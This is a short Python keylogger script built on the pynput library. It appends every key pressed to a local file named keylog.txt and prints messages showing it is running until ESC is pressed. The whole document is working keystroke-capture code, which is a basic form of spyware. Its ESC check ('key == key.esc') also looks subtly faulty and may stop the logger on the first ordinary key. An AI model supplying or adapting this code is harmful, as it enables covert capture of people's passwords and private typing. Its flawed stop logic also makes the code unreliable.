from pynput.keyboard import Listener

# File to save keystrokes
log_file = "keylog.txt"

# Function to handle key press
def on_press(key):
    try:
        with open(log_file, "a") as file:
            file.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as file:
            file.write(f" [{key}] ")

# Function to stop logger
def on_release(key):

    # Press ESC to stop
    if key == key.esc:
        return False

# Start listening
print("Keylogger is running...")
print("Press ESC to stop.")

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

print("Keylogger stopped.")